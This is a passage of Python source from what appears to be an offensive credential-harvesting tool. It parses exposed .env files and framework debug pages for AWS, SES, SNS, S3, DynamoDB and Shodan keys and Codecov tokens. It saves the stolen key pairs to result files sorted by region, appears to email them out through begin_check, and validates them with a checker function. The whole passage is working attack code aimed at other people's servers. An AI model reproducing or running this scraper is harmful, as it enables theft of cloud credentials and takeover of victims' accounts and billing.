				build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSHODAN_API_KEY: '+str(xixi_key)+'\nSHODAN_REQUEST_TIMEOUT: '+str(req_tim)+'\nCODECOV_TOKEN: '+str(sec)
				remover = str(build).replace('\r', '')
				save = open('Results/SHODAN.txt', 'a')
				save.write(remover+'\n\n')
				save.close()
				return True
			else:
				return False
		except:
				return False
	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break
	def get_raw_mode(self, text, url):
		try:
			if "email-smtp." in text:
				if "<html>" in text:
					method = 'debug'
				else:
					method = '.env'

				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open('Results/manual/MANUAL_SES.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
					except:
						aws_buc = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_buc = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SNS_KEY" in text:
				if "AWS_SNS_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SNS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SNS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("\nSMS_FROM=(.*?)\n", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("\nSMS_DRIVER=(.*?)\n", text)[0]
					except:
						sms_deiver = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SNS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_driver = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_S3_KEY" in text:
				if "AWS_S3_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_S3_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_S3_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_S3_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SES_KEY" in text:
				if "AWS_SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_ACCESS_KEY_ID_2" in str(text):
				if "AWS_ACCESS_KEY_ID_2=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_ACCESS_KEY_ID_2=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY_2=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID_2</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "FILESYSTEMS_DISKS_S3_KEY" in str(text):
				if "FILESYSTEMS_DISKS_S3_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nFILESYSTEMS_DISKS_S3_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nFILESYSTEMS_DISKS_S3_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>FILESYSTEMS_DISKS_S3_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>FILESYSTEMS_DISKS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>FILESYSTEMS_DISKS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "DYNAMODB_KEY" in str(text):
				if "DYNAMODB_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nDYNAMODB_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nDYNAMODB_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>DYNAMODB_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>DYNAMODB_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>DYNAMODB_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "STORAGE_KEY" in str(text):
				if "STORAGE_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSTORAGE_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSTORAGE_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>STORAGE_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>STORAGE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>STORAGE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "#MAIL_SES_KEY" in str(text):
				if "#MAIL_SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n#MAIL_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n#MAIL_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>#MAIL_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>#MAIL_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>#MAIL_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AMAZON_API_KEY" in str(text):
				if "AMAZON_API_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAMAZON_API_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAMAZON_API_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AMAZON_API_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AMAZON_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AMAZON_API_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_CLIENT_SECRET_KEY" in str(text):
				if "AWS_CLIENT_SECRET_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_CLIENT_SECRET_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SERVER_PUBLIC_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_CLIENT_SECRET_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_CLIENT_SECRET_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SERVER_PUBLIC_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "MAIL_SES_KEY" in str(text):
				if "MAIL_SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nMAIL_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nMAIL_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>MAIL_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>MAIL_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>MAIL_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "MAIL_SES_KEY" in str(text):
				if "MAIL_SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nMAIL_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nMAIL_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>MAIL_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>MAIL_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>MAIL_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_CLOUD_WATCH_KEY_ID" in str(text):
				if "AWS_CLOUD_WATCH_KEY_ID=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_CLOUD_WATCH_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_CLOUD_WATCH_KEY_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = legion().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_CLOUD_WATCH_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_CLOUD_WATCH_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
